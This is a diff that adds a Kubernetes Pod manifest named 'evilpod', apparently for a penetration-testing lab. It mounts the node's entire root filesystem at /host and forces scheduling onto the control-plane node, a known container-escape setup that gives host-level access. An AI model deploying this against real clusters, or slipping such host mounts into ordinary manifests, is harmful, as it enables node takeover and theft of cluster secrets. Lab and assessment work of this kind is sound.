@@ -1,0 +1,29 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: evilpod
+  namespace: lab-namespace
+  labels:
+    app: pentest
+spec:
+  containers:
+  - name: evilpod
+    image: ubuntu
+    resources:
+      requests:
+        memory: "64Mi"
+        cpu: "250m"
+      limits:
+        memory: "256Mi"
+        cpu: "500m"
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  nodeName: lab-control-plane # Forces pod to run on control-plane node
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+  
